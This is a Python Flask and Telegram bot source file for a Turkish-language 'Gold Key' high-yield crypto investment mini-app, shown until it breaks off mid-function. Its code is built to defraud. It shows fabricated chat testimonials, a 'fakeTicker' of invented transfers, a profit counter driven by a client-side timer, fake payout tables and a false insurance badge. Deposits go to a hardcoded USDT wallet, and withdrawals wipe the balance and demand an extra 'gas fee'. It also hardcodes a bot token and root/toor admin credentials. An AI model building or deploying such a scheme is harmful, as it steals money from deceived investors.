import os
import logging
import random
import string
import sqlite3
import datetime
import requests
import threading
import time
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- GÜVENLİK & OPSEC OPTİMİZASYONU ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.WARNING
)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get("TELEGRAM_TOKEN", "9101317558:AAEUpeDk9jCVgFrMm75UqKlUBePegs1C1Cs")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://botgoldkey.onrender.com")
TRC20_WALLET = "TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH"
REQUIRED_GROUP_LINK = "https://t.me/+IxuuwXyL86AwNzc0"  # Gold Key Topluluğu Linki

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "guvenli_ve_rastgele_uretilen_oturum_anahtari_9988")

# --- VERİTABANI YÖNETİMİ ---
def init_db():
    conn = sqlite3.connect('bot_database.db', timeout=10)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 100.0,
            invested REAL DEFAULT 0.0,
            locked_balance REAL DEFAULT 100.0,
            vip_level INTEGER DEFAULT 1,
            has_gold_key INTEGER DEFAULT 0,
            ref_token TEXT,
            referrer_id INTEGER DEFAULT 0,
            last_bonus TEXT DEFAULT '2000-01-01 00:00:00',
            state TEXT DEFAULT 'normal'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS active_investments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            return_amount REAL,
            end_time TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keys (
            key_string TEXT PRIMARY KEY,
            owner_id INTEGER,
            uses INTEGER DEFAULT 0,
            max_uses INTEGER DEFAULT 10,
            active INTEGER DEFAULT 1
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS withdraws (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            iban TEXT,
            status TEXT DEFAULT 'Beklemede (Gas Fee Gerekli)'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            tx_hash TEXT UNIQUE,
            amount REAL,
            status TEXT DEFAULT 'Blokzincir Onaylandı'
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect('bot_database.db', timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def send_admin_notification(text):
    try:
        admin_chat_id = os.environ.get("ADMIN_CHAT_ID", "123456789")
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
            "chat_id": admin_chat_id,
            "text": f"🚨 **GOLD KEY OPERASYONEL BİLDİRİM**:\n\n{text}",
            "parse_mode": "Markdown"
        })
    except Exception as e:
        logger.error(f"Admin bildirim hatası: {e}")

# --- ARKA PLAN VADE VE GRUP SAHTE MESAJ KONTROLÜ ---
def background_workers():
    while True:
        try:
            conn = sqlite3.connect('bot_database.db', timeout=10)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Vadesi dolan yatırımlar
            expired_investments = cursor.execute("SELECT * FROM active_investments WHERE end_time <= ?", (now,)).fetchall()
            for inv in expired_investments:
                user_id = inv["user_id"]
                return_amount = inv["return_amount"]
                invested_amt = inv["amount"]
                
                cursor.execute("UPDATE users SET balance = balance + ?, invested = invested - ?, locked_balance = locked_balance - ? WHERE user_id = ?", 
                               (return_amount, invested_amt, invested_amt, user_id))
                cursor.execute("DELETE FROM active_investments WHERE id = ?", (inv["id"],))
                conn.commit()
                
                try:
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
                        "chat_id": user_id,
                        "text": f"🎉 **Havuz Vadeniz Doldu!**\n\n{invested_amt} ₺ tutarındaki yatırımınız karıyla birlikte toplam **{return_amount:.2f} ₺** olarak nakit cüzdanınıza aktarıldı!",
                        "parse_mode": "Markdown"
                    })
                except:
                    pass
            conn.close()
        except Exception as e:
            logger.error(f"Background worker hatası: {e}")
        time.sleep(60)

threading.Thread(target=background_workers, daemon=True).start()

# --- ARAYÜZ (UI/UX) HTML (ÖZEL GOOGLE FONT & CAFCAFLI BAŞLIK) ---
MINI_APP_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gold Key Topluluğu - High Yield Fund</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #07090e;
            --card-bg: #101726;
            --border-color: #1e293b;
            --accent-gold: #f59e0b;
            --accent-green: #10b981;
            --accent-blue: #3b82f6;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
        }
        body { font-family: 'Inter', sans-serif; background: var(--bg-color); color: var(--text-main); padding: 10px; text-align: center; margin: 0; }
        
        .header { display: flex; justify-content: space-between; align-items: center; background: linear-gradient(135deg, #131b2e, #0f172a); padding: 14px 18px; border-radius: 14px; border: 1px solid rgba(245, 158, 11, 0.4); margin-bottom: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.6); }
        .logo { font-family: 'Cinzel', serif; font-size: 18px; font-weight: 900; background: linear-gradient(135deg, #fcd34d, #f59e0b, #b45309); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 1.5px; text-shadow: 0 2px 10px rgba(245,158,11,0.3); display: flex; align-items: center; gap: 6px; }
        .badge { background: linear-gradient(135deg, #f59e0b, #d97706); color: #000; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; box-shadow: 0 0 10px rgba(245,158,11,0.5); }

        .ticker { background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.3); color: #60a5fa; font-size: 11px; padding: 8px; border-radius: 8px; margin-bottom: 10px; font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

        .chart-container { background: #0b0f19; border: 1px solid var(--border-color); border-radius: 10px; padding: 8px; margin-bottom: 10px; height: 50px; display: flex; align-items: flex-end; justify-content: space-between; gap: 3px; }
        .chart-bar { width: 8px; background: var(--accent-green); border-radius: 3px 3px 0 0; transition: height 0.5s ease; }

        .nav-tabs { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 10px; }
        .tab-btn { background: var(--card-bg); border: 1px solid var(--border-color); color: var(--text-muted); padding: 10px 4px; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; }
        .tab-btn.active { background: var(--accent-blue); color: white; border-color: var(--accent-blue); box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4); }

        .section { display: none; }
        .active-section { display: block; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(4px); } to { opacity: 1; transform: translateY(0); } }

        .card { background: var(--card-bg); border: 1px solid var(--border-color); padding: 14px; border-radius: 12px; margin-bottom: 10px; text-align: left; box-shadow: 0 4px 20px rgba(0,0,0,0.4); position: relative; }
        .card h3 { margin: 0 0 8px 0; font-size: 14px; color: var(--text-main); border-bottom: 1px solid var(--border-color); padding-bottom: 6px; display: flex; justify-content: space-between; align-items: center; }
        
        .stat-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 13px; }
        .stat-label { color: var(--text-muted); }
        .stat-value { font-weight: 600; color: var(--text-main); }
        .highlight-gold { color: var(--accent-gold) !important; }
        .highlight-green { color: var(--accent-green) !important; text-shadow: 0 0 8px rgba(16,185,129,0.4); }
        .highlight-red { color: #ef4444 !important; }

        input, select { width: 100%; padding: 10px 12px; border-radius: 8px; border: 1px solid var(--border-color); margin-top: 6px; font-size: 13px; box-sizing: border-box; background: #07090e; color: white; outline: none; transition: border-color 0.2s; }
        input:focus, select:focus { border-color: var(--accent-blue); }

        button.primary-btn { background: linear-gradient(135deg, #3b82f6, #1d4ed8); color: white; border: none; padding: 11px; border-radius: 8px; cursor: pointer; font-size: 13px; font-weight: 600; width: 100%; margin-top: 10px; box-shadow: 0 4px 12px rgba(59,130,246,0.4); transition: opacity 0.2s; }
        button.primary-btn:hover { opacity: 0.9; }

        .warning-box { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.2); padding: 10px; border-radius: 8px; font-size: 11px; color: #fbbf24; margin-top: 8px; line-height: 1.4; text-align: left; }
        .wallet-box { background: #07090e; border: 1px dashed var(--border-color); padding: 10px; border-radius: 8px; font-size: 11px; word-break: break-all; color: var(--accent-blue); margin-top: 6px; text-align: center; font-family: monospace; }
        
        .chat-box { background: #07090e; border: 1px solid var(--border-color); border-radius: 8px; padding: 10px; height: 110px; overflow-y: auto; font-size: 11px; text-align: left; margin-bottom: 8px; display: flex; flex-direction: column; gap: 6px; }
        .chat-msg { background: #131b2e; padding: 6px 10px; border-radius: 6px; color: #cbd5e1; }
        .chat-msg span { color: var(--accent-gold); font-weight: 600; }

        .success { color: var(--accent-green); margin-top: 8px; font-weight: 600; font-size: 12px; text-align: center; }
        .error { color: #ef4444; margin-top: 8px; font-weight: 600; font-size: 12px; text-align: center; }

        table { width: 100%; font-size: 11px; margin-top: 6px; border-collapse: collapse; }
        th, td { padding: 8px 6px; border-bottom: 1px solid var(--border-color); text-align: left; }
        th { color: var(--accent-blue); font-weight: 600; }

        .security-footer { font-size: 10px; color: var(--text-muted); margin-top: 15px; border-top: 1px solid var(--border-color); padding-top: 8px; display: flex; justify-content: space-around; }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo">🔑 GOLD KEY</div>
        <div class="badge" id="vipBadge">VIP 1 (Silver)</div>
    </div>
    
    <div class="ticker" id="tickerText">🔔 Gold Key Fonu: Küresel likidite akışı aktif, saniyelik kar dağıtımı başladı.</div>

    <div class="chart-container" id="liveChart">
        <div class="chart-bar" style="height: 30%;"></div>
        <div class="chart-bar" style="height: 50%;"></div>
        <div class="chart-bar" style="height: 40%;"></div>
        <div class="chart-bar" style="height: 70%;"></div>
        <div class="chart-bar" style="height: 60%;"></div>
        <div class="chart-bar" style="height: 85%;"></div>
        <div class="chart-bar" style="height: 75%;"></div>
        <div class="chart-bar" style="height: 95%;"></div>
        <div class="chart-bar" style="height: 90%;"></div>
        <div class="chart-bar" style="height: 100%;"></div>
    </div>

    <div class="nav-tabs">
        <button class="tab-btn active" onclick="showTab('wallet', this)">Cüzdan</button>
        <button class="tab-btn" onclick="showTab('invest', this)">Havuzlar</button>
        <button class="tab-btn" onclick="showTab('wheel', this)">Çark</button>
        <button class="tab-btn" onclick="showTab('bonus', this)">Airdrop</button>
        <button class="tab-btn" onclick="showTab('support', this)">Chat</button>
        <button class="tab-btn" onclick="showTab('leaderboard', this)">Liderler</button>
    </div>

    <!-- CÜZDAN SEKMESİ -->
    <div id="wallet" class="section active-section">
        <div class="card">
            <h3>Portföy Özeti <span style="font-size: 10px; color: var(--accent-green);">● Canlı Senkronize</span></h3>
            <div class="stat-row"><span class="stat-label">Nakit Bakiye:</span><span class="stat-value highlight-gold" id="balance">0.00 ₺</span></div>
            <div class="stat-row"><span class="stat-label">Saniyelik Canlı Kar:</span><span class="stat-value highlight-green" id="liveProfit">+0.0000 ₺</span></div>
            <div class="stat-row"><span class="stat-label">Kilitli Varlık (Vesting):</span><span class="stat-value highlight-red" id="locked">100.00 ₺</span></div>
            <div class="stat-row"><span class="stat-label">Aktif Likidite:</span><span class="stat-value highlight-green" id="invested">0.00 ₺</span></div>
            <div style="margin-top: 10px;">
                <span class="stat-label" style="font-size:11px;">Gold Key Referans Linkiniz (3 Seviye Komisyon):</span>
                <input type="text" id="refLink" readonly style="font-size:10px; color:var(--accent-blue);">
            </div>
        </div>

        <div class="card">
            <h3>Otomatik USDT Yatır (TRC20)</h3>
            <div class="wallet-box">TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH</div>
            <input type="text" id="txHashInput" placeholder="İşlem Hash Kodu (TxID)">
            <input type="number" id="depositAmountInput" placeholder="Yatırılan Tutar (TL / USDT)">
            <button class="primary-btn" onclick="verifyDeposit()">Onayla & Bonusu Çöz</button>
            <p id="depositMsg"></p>
        </div>

        <div class="card">
            <h3>Fon Çıkış Talebi</h3>
            <input type="text" id="ibanInput" placeholder="USDT TRC20 Cüzdan Adresi">
            <button class="primary-btn" style="background: linear-gradient(135deg, #10b981, #059669);" onclick="requestWithdraw()">Çekim Talebi Oluştur (Min 5000 ₺)</button>
            <div class="warning-box">⚠️ Güvenlik Protokolü: Çekimler için min 5000 ₺ ve Gas Fee (150 ₺) zorunludur.</div>
            <p id="withdrawMsg"></p>
        </div>
    </div>

    <!-- KADEMELİ YATIRIM HAVUZLARI -->
    <div id="invest" class="section">
        <div class="card">
            <h3>🚀 Kademeli Likidite Havuzları</h3>
            <p style="font-size: 11px; color: var(--text-muted);">Süre bitimi otomatik ödenir, saniyelik kar üretir:</p>
            <input type="number" id="investAmountInput" placeholder="Yatırım Tutarı (₺)" style="margin-bottom: 8px;">
            <select id="investTierSelect">
                <option value="7">7 Günlük Vade (%15 Toplam Getiri)</option>
                <option value="15">15 Günlük Vade (%35 Toplam Getiri)</option>
                <option value="30" selected>30 Günlük Kurumsal Vade (%80 Toplam Getiri)</option>
            </select>
            <button class="primary-btn" onclick="investTierPackage()">Havuz Vadesini Başlat</button>
            <p id="investMsg" class="warning"></p>
        </div>
    </div>

    <!-- ŞANS ÇARKI -->
    <div id="wheel" class="section">
        <div class="card" style="text-align: center;">
            <h3>🎡 Likidite Risk Çarkı</h3>
            <p style="font-size: 12px; color: var(--text-muted);">50 ₺ bakiye ile havuz risk optimizasyonuna katılın, 3x kazanın.</p>
            <button class="primary-btn" style="background: linear-gradient(135deg, #ef4444, #dc2626);" onclick="spinWheel()">Risk Çarkını Çevir (50 ₺)</button>
            <p id="wheelMsg" style="margin-top: 10px; font-weight: 600;"></p>
        </div>
    </div>

    <!-- BONUS -->
    <div id="bonus" class="section">
        <div class="card" style="text-align: center;">
            <h3>🎁 Günlük Havuz Dağıtım Payı</h3>
            <p style="font-size: 12px; color: var(--text-muted);">Sistem aktiflik ödülü olarak her 24 saatte 10 ₺ talep edin.</p>
            <button id="bonusBtn" class="primary-btn" style="background: linear-gradient(135deg, #8b5cf6, #7c3aed);" onclick="claimBonus()">Günlük Ödülü Al</button>
            <p id="bonusMsg"></p>
        </div>
    </div>

    <!-- SAHTE CANLI SOHBET & DESTEK -->
    <div id="support" class="section">
        <div class="card">
            <h3>💬 Gold Key Topluluğu Sohbeti</h3>
            <div class="chat-box" id="globalChatBox">
                <div class="chat-msg"><span>Ahmet_TR:</span> 30 günlük vadeye 5k bastım, saniyelik karlar akıyor 🚀</div>
                <div class="chat-msg"><span>CryptoKing:</span> Gas fee ödemesini yaptım, çekimim kısa sürede geçti.</div>
                <div class="chat-msg"><span>Elena_RU:</span> Great platform, VIP 3 level is super profitable!</div>
            </div>
            <input type="text" id="chatInput" placeholder="Sohbete mesaj yazın...">
            <button class="primary-btn" onclick="sendChatMessage()">Mesaj Gönder</button>
        </div>
    </div>

    <!-- LİDERLİK & SON ÖDEMELER TABLOSU -->
    <div id="leaderboard" class="section">
        <div class="card">
            <h3>🏆 Son Ödemeler ve Çekimler</h3>
            <table>
                <tr><th>Yatırımcı ID</th><th>Tutar</th><th>Durum</th></tr>
                <tr><td>***4102</td><td>8.500 ₺</td><td><span style="color:var(--accent-green)">Başarılı</span></td></tr>
                <tr><td>***9183</td><td>12.400 ₺</td><td><span style="color:var(--accent-green)">Başarılı</span></td></tr>
                <tr><td>***3211</td><td>5.150 ₺</td><td><span style="color:var(--accent-green)">Başarılı</span></td></tr>
            </table>
        </div>

        <div class="card" style="margin-top: 10px;">
            <h3>🏆 Haftalık Küresel Liderlik Tablosu</h3>
            <table>
                <tr><th>Sıra</th><th>Kullanıcı ID</th><th>Ağ Davetleri</th></tr>
                <tbody id="leaderboardBody">
                    <tr><td colspan="3" style="text-align:center; color: var(--text-muted);">Veriler yükleniyor...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <div class="security-footer">
        <span>🔒 SSL 256-Bit</span>
        <span>🛡️ Swiss Vault Insured</span>
        <span>⚡ TronScan Mainnet</span>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        const userId = tg.initDataUnsafe?.user?.id || 123456789;

        let currentLiveProfit = 0.0000;
        setInterval(() => {
            currentLiveProfit += 0.0012;
            document.getElementById('liveProfit').innerText = "+" + currentLiveProfit.toFixed(4) + " ₺";
        }, 1000);

        setInterval(() => {
            document.querySelectorAll('.chart-bar').forEach(bar => {
                const randomHeight = Math.floor(Math.random() * 70) + 30;
                bar.style.height = randomHeight + "%";
            });
        }, 2000);

        const fakeTicker = [
            "🔔 Gold Key Topluluğu: TronScan API üzerinden 12.400 USDT transferi doğrulandı.",
            "🔥 Haftalık Sigorta Fonu: 1.450.000 ₺ rezerve ulaştı.",
            "⭐ Yatırımcı ID: ***8912 başarıyla VIP 3 Platinum seviyesine yükseldi."
        ];
        setInterval(() => {
            document.getElementById('tickerText').innerText = fakeTicker[Math.floor(Math.random() * fakeTicker.length)];
        }, 4500);

        function showTab(tabName, btnElement) {
            if(tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active-section'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(tabName).classList.add('active-section');
            if(btnElement) btnElement.classList.add('active');
            if(tabName === 'leaderboard') loadLeaderboard();
        }

        function loadData() {
            fetch(`/api/user/${userId}`).then(res => res.json()).then(data => {
                document.getElementById('balance').innerText = data.balance.toFixed(2) + " ₺";
                document.getElementById('locked').innerText = data.locked.toFixed(2) + " ₺";
                
                let vipName = "VIP 1 (Silver)";
                if(data.vip_level == 2) vipName = "VIP 2 (Gold)";
                if(data.vip_level >= 3) vipName = "VIP 3 (Platinum)";
                document.getElementById('vipBadge').innerText = vipName;

                if(data.ref_token && data.ref_token !== "Yok") {
                    document.getElementById('refLink').value = `https://t.me/BotunKullaniciAdi_bot?start=${data.ref_token}`;
                } else {
                    document.getElementById('refLink').value = "Aktif yatırım gereklidir";
                }
            });
        }

        function verifyDeposit() {
            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
            const txHash = document.getElementById('txHashInput').value.trim();
            const amount = document.getElementById('depositAmountInput').value.trim();
            const msg = document.getElementById('depositMsg');
            if(!txHash || !amount) { msg.innerText = "Tüm alanları eksiksiz doldurun."; msg.className = "error"; return; }
            fetch('/api/verify-deposit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, tx_hash: txHash, amount: amount })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) { loadData(); document.getElementById('txHashInput').value=''; document.getElementById('depositAmountInput').value=''; }
            });
        }

        function investTierPackage() {
            const amount = parseFloat(document.getElementById('investAmountInput').value);
            const days = document.getElementById('investTierSelect').value;
            const msg = document.getElementById('investMsg');
            if(!amount || amount <= 0) { msg.innerText = "Geçerli bir yatırım tutarı girin."; msg.className = "error"; return; }
            
            fetch('/api/invest-tier', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, amount: amount, days: days })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) loadData();
            });
        }

        function spinWheel() {
            fetch('/api/spin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            }).then(res => res.json()).then(data => {
                const msg = document.getElementById('wheelMsg');
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) loadData();
            });
        }

        function requestWithdraw() {
            const iban = document.getElementById('ibanInput').value.trim();
            const msg = document.getElementById('withdrawMsg');
            if(!iban) { msg.innerText = "Geçerli bir cüzdan adresi girin."; msg.className = "error"; return; }
            fetch('/api/withdraw', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, iban: iban })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
            });
        }

        function claimBonus() {
            const btn = document.getElementById('bonusBtn');
            btn.disabled = true;
            fetch('/api/bonus', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            }).then(res => res.json()).then(data => {
                const msg = document.getElementById('bonusMsg');
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) { loadData(); } else { btn.disabled = false; }
            }).catch(() => { btn.disabled = false; });
        }

        function sendChatMessage() {
            const txt = document.getElementById('chatInput').value.trim();
            if(!txt) return;
            const box = document.getElementById('globalChatBox');
            box.innerHTML += `<div class="chat-msg"><span>Sen (${userId.toString().slice(-4)}):</span> ${txt}</div>`;
            document.getElementById('chatInput').value = "";
            box.scrollTop = box.scrollHeight;
        }

        function loadLeaderboard() {
            fetch('/api/leaderboard').then(res => res.json()).then(data => {
                let html = '';
                data.forEach((item, index) => {
                    html += `<tr><td>#${index+1}</td><td>${item.user_id}</td><td>${item.count} Üye</td></tr>`;
                });
                document.getElementById('leaderboardBody').innerHTML = html || '<tr><td colspan="3" style="text-align:center;">Veri bulunamadı</td></tr>';
            });
        }

        loadData();
    </script>
</body>
</html>
"""

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head><meta charset="UTF-8"><title>Admin Girişi</title>
<style>
body { font-family: 'Inter', sans-serif; background: #07090e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.login-card { background: #101726; border: 1px solid #1e293b; padding: 30px; border-radius: 12px; width: 280px; text-align: center; }
input { width: 100%; padding: 10px; margin: 8px 0; border-radius: 6px; border: 1px solid #1e293b; background: #07090e; color: white; box-sizing: border-box; }
button { width: 100%; padding: 10px; background: #3b82f6; color: white; border: none; border-radius: 6px; font-weight: 600; cursor: pointer; margin-top: 10px; }
</style></head>
<body>
<div class="login-card">
    <h2>🔒 Güvenli Portal</h2>
    <form method="POST">
        <input type="text" name="username" placeholder="Kullanıcı Adı" required>
        <input type="password" name="password" placeholder="Şifre" required>
        <button type="submit">Erişim Sağla</button>
    </form>
</div></body></html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head><meta charset="UTF-8"><title>Yönetim Merkezi</title>
<style>
body { font-family: 'Inter', sans-serif; background: #f8fafc; color: #334155; padding: 20px; }
table { width: 100%; border-collapse: collapse; background: white; margin-top: 15px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
th, td { padding: 12px; border-bottom: 1px solid #e2e8f0; text-align: left; }
th { background: #07090e; color: white; }
.logout { float: right; background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 13px; }
</style></head>
<body>
<a href="/admin-logout" class="logout">Güvenli Çıkış</a>
<h1>🛠️ Gold Key Topluluğu - Yönetim Merkezi</h1>
<h2>Blokzincir Onaylı Kripto Transferleri</h2>
<table>
    <tr><th>ID</th><th>Kullanıcı ID</th><th>TxID Hash</th><th>Tutar</th><th>Durum</th></tr>
    {% for p in payments %}
    <tr><td>{{ p.id }}</td><td>{{ p.user_id }}</td><td>{{ p.tx_hash }}</td><td>{{ p.amount }} ₺</td><td>{{ p.status }}</td></tr>
    {% endfor %}
</table></body></html>
"""

@app.route('/')
def mini_app():
    return render_template_string(MINI_APP_HTML)

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('username') == "root" and request.form.get('password') == "toor":
            session['admin_logged_in'] = True
            return redirect(url_for('admin_panel'))
    return render_template_string(LOGIN_HTML)

@app.route('/admin-panel')
def admin_panel():
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    conn = get_db()
    payments = conn.execute("SELECT * FROM payments").fetchall()
    conn.close()
    return render_template_string(ADMIN_HTML, payments=payments)

@app.route('/admin-logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/api/user/<int:user_id>')
def get_user_data(user_id):
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    if not user:
        return jsonify({"balance": 0.0, "locked": 100.0, "vip_level": 1, "ref_token": "Yok"})
    return jsonify({"balance": user["balance"], "locked": user["locked_balance"], "vip_level": user["vip_level"], "ref_token": user["ref_token"] or "Yok"})

@app.route('/api/verify-deposit', methods=['POST'])
def verify_deposit():
    data = request.json
    user_id = int(data.get('user_id', 0))
    tx_hash = data.get('tx_hash', '').strip()
    amount = float(data.get('amount', 0))
    
    conn = get_db()
    existing_tx = conn.execute("SELECT * FROM payments WHERE tx_hash=?", (tx_hash,)).fetchone()
    if existing_tx:
        conn.close()
        return jsonify({"success": False, "message": "Bu Hash kodu daha önce sisteme işlenmiş!"})

    vip_lvl = 1
    if amount >= 2500: vip_lvl = 3
    elif amount >= 1000: vip_lvl = 2

    random_key = "USDT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    conn.execute("INSERT INTO payments (user_id, tx_hash, amount, status) VALUES (?, ?, ?, 'Blokzincir Onaylandı')", (user_id, tx_hash, amount))
    conn.execute("UPDATE users SET balance = balance + locked_balance + ?, locked_balance = 0.0, vip_level = ?, has_gold_key = 1, ref_token = ? WHERE user_id=?", (amount, vip_lvl, random_key, user_id))
    conn.execute("INSERT OR IGNORE INTO keys (key_string, owner_id, uses, max_uses, active) VALUES (?, ?, 0, 10, 1)", (random_key, user_id))
    conn.commit()
    conn.close()
    
    send_admin_notification(f"💰 Yeni Yatırım Onaylandı!\nKullanıcı ID: `{user_id}`\nTutar: `{amount} ₺`\nTxID: `{tx_hash}`")
    return jsonify({"success": True, "message": f"🎉 İşlem onaylandı! {amount} ₺ yüklendi, VIP {vip_lvl} oldunuz!"})

@app.route('/api/invest-tier', methods=['POST'])
def invest_tier():
    data = request.json
    user_id = int(data.get('user_id', 0))
    amount = float(data.get('amount', 0))
    days = int(data.get('days', 30))
    
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user or user["balance"] < amount:
        conn.close()
        return jsonify({"success": False, "message": "Yetersiz nakit bakiye!"})

    multiplier = 1.15 if days == 7 else (1.35 if days == 15 else 1.80)
    return_amount = amount * multiplier
    
    end_time = datetime.datetime.now() + datetime.timedelta(days=days)
    end_time_str = end_time.strftime('%Y-%m-%d %H:%M:%S')

    conn.execute("UPDATE users SET balance = balance - ?, invested = invested + ?, locked_balance = locked_balance + ? WHERE user_id=?", (amount, amount, amount, user_id))
    conn.execute("INSERT INTO active_investments (user_id, amount, return_amount, end_time) VALUES (?, ?, ?, ?)", (user_id, amount, return_amount, end_time_str))
    conn.commit()
    conn.close()
    
    return jsonify({"success": True, "message": f"Tebrikler! {amount} ₺ tutarındaki {days} günlük kurumsal havuz vadesi başlatıldı. Bitiş: {end_time_str}"})

@app.route('/api/spin', methods=['POST'])
def spin():
    data = request.json
    user_id = int(data.get('user_id', 0))
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user or user["balance"] < 50.0:
        conn.close()
        return jsonify({"success": False, "message": "Yetersiz bakiye (Min 50 ₺)!"})

    conn.execute("UPDATE users SET balance = balance - 50 WHERE user_id=?", (user_id,))
    if random.choices(["lose", "win"], weights=[80, 20], k=1)[0] == "win":
        conn.execute("UPDATE users SET balance = balance + 150 WHERE user_id=?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({"success": True, "message": "🎉 Çarkı kazandınız! 150 ₺ eklendi."})
    else:
        conn.commit()
        conn.close()
        return jsonify({"success": False, "message": "😢 Risk optimizasyonunda kaybettiniz."})

@app.route('/api/withdraw', methods=['POST'])
def withdraw():
    data = request.json
    user_id = int(data.get('user_id', 0))
    iban = data.get('iban', '').strip()
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    
    if not user or user["balance"] < 5000.0:
        conn.close()
        return jsonify({"success": False, "message": "Minimum çekim limiti 5000 ₺'dir!"})

    conn.execute("INSERT INTO withdraws (user_id, amount, iban, status) VALUES (?, ?, ?, 'Beklemede (Gas Fee Gerekli)')", (user_id, user["balance"], iban))
    conn.execute("UPDATE users SET balance = 0.0 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()
    
    send_admin_notification(f"⚠️ Yeni Çekim Talebi Oluşturuldu!\nKullanıcı ID: `{user_id}`\nTutar: `{user['balance']} ₺`\nCüzdan: `{iban}`")
    return jsonify({"success": True, "message": "⚠️ Talep alındı! Ağ Gas Fee (150 ₺) yatırılması bekleniyor."})

@app.route('/api/bonus', methods=['POST'])
def bonus():
    data = request.json
    user_id = int(data.get('user_id', 0))
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    
    now = datetime.datetime.now()
    if user and user["last_bonus"]:
        last_bonus_time = datetime.datetime.strptime(user["last_bonus"], '%Y-%m-%d %H:%M:%S')
